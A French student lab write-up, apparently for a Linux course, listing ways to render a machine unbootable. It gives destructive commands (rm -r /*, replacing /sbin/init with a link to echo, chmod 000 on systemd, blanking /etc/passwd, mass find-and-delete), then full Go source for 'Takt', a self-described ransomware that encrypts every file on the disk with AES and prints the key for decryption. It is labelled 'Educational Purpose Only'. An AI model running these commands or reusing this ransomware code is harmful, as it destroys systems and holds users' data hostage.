# TP 1 : Are you dead yet ?

---

**🌞 Plusieurs façons différentes de péter la machine :**

**➜ Premiere façon :**

    tomfox@tomfox:~$ sudo rm -r /*
    
Ici je supprime tout depuis la racine

**➜ Deuxième façon :**

    tomfox@tomfox:~$ cd /sbin
	tomfox@tomfox:/sbin$ sudo rm init
	tomfox@tomfox:/sbin$ sudo ln -s /usr/bin/echo init
    
Je me déplace dans le dossier sbin puis je supprime le init (c'est le premier process lancé par linux (PID 1)).
Puis je crée un nouveau link pour que init renvoie vers echo et non plus vers /lib/systemd/systemd

**➜ Troisième façons :**

    tomfox@tomfox:~$ sudo su -
    root@tomfox:~# chmod 000 /lib/systemd/systemd


Cette commande enlève les droits à tout le monde (même root) d'exécuter ce fichier, donc si ce fichier n'est pas lançable le linux ne boot pas car ce file est nécessaire pour le bon fonctionnement de linux

**➜ Quatrième façons :**

    tomfox@tomfox:~$ sudo su -
    root@tomfox:~# echo "" > /etc/passwd

Je supprime tout le contenu de /etc/passwd (contenu nécessaire pour le bon fonctionnement des sessions)

**➜ Cinquième façons :**
    
    tomfox@tomfox:~$ sudo su -
    root@tomfox:~# find / -type f | grep linux | xargs rm -rf

Ici je find tout le file (-type f) dans le system qui contient "linux" dans son full path name et ensuite je les supprime en utilisant un pipe et xargs pour prendre chaque ligne de output comme argument pour mon rm (-r pour récursif et -f pour force)


**➜ Sixième façons :**

Context : V1 de notre Takt ransomware, notre projet file rouge avec [Hyouka](https://github.com/HyouKash) en SSI

Pour chiffrer : 
    
    go build takt.go
    sudo ./takt

Pour déchiffrer : 
    
    sudo ./takt --decrypt <BASE64(AES_KEY)>
    
```
#takt.go

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "log"
    "os"
    "os/exec"
    "strings"
    "sync"
)

var wg sync.WaitGroup
var wgc sync.WaitGroup

var CryptKey = aesKey()

var IV = []byte("1234567812345678")

func createKey() []byte {
    genkey := make([]byte, 32)
    _, err := rand.Read(genkey)
    if err != nil {
        log.Fatalf("Failed to read new random key: %s", err)
    }
    return genkey
}

func aesKey() []byte {
    key := createKey()
    return key
}

func createCipher() cipher.Block {
    c, err := aes.NewCipher(CryptKey)
    if err != nil {
        log.Fatalf("Failed to create the AES cipher: %s", err)
    }
    return c
}

func Crypt(filename string, ch chan string) {
    file, _ := os.Open(filename)
    fileInfo, err := os.Stat(filename)
    if err != nil {
        wgc.Done()
        file.Close()
        Crypt(<-ch, ch)
    }
    if fileInfo.Size() > 200000000 {
        wgc.Done()
        file.Close()
        Crypt(<-ch, ch)
    }
    arr := make([]byte, fileInfo.Size())
    _, _ = file.Read(arr)
    file.Close()
    blockCipher := createCipher()
    stream := cipher.NewCTR(blockCipher, IV)
    stream.XORKeyStream(arr, arr)
    _ = ioutil.WriteFile(filename, arr, 0644)
    wgc.Done()
    Crypt(<-ch, ch)
}

func DeCrypt(filename string, ch chan string) {
    bytes, _ := ioutil.ReadFile(filename)
    blockCipher, _ := aes.NewCipher(CryptKey)
    stream := cipher.NewCTR(blockCipher, IV)
    stream.XORKeyStream(bytes, bytes)
    _ = ioutil.WriteFile(filename, bytes, 0644)
    wgc.Done()
    DeCrypt(<-ch, ch)
}

func main() {
    cmd := exec.Command("bash", "-c", "find / -type f")
    output, _ := cmd.CombinedOutput()
    listfile := strings.Split(string(output), "\n")
    ch := make(chan string, len(listfile))
    for _, file := range listfile {
        wg.Add(1)
        wgc.Add(1)
        go func(file string) {
            ch <- file
            wg.Done()
        }(file)
    }
    wg.Wait()
    args := os.Args[1:]
    if len(args) == 0 {
        fmt.Print("Crypt With ")
        fmt.Println(base64.StdEncoding.EncodeToString(CryptKey))
        for i := 0; i < 100; i++ {
            if len(ch) == 0 {
                break
            }
            go Crypt(<-ch, ch)
        }
        wgc.Wait()
    } else if len(args) == 2 && args[0] == "--decrypt" {
        CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
        fmt.Print("Decrypt With ")
        fmt.Println(base64.StdEncoding.EncodeToString(CryptKey))
        for i := 0; i < 100; i++ {
            if len(ch) == 0 {
                break
            }
            go DeCrypt(<-ch, ch)
        }
        wgc.Wait()
    }
}
```

Explications : Takt ransomware utilise du Threading et des channels (fonctionnement de pile). La clé de chiffrement est en AES 256 et est générée de manière aléatoire. Ces procédés le rendent extrêmement rapide. Il chiffre l'entiéreté du disque (pour cette version, il chiffre le système également, si besoin on possède une version qui permet au système de survivre), l'utilisateur n'a accès a plus aucune de ses données. 

EPO : Educational Purpose Only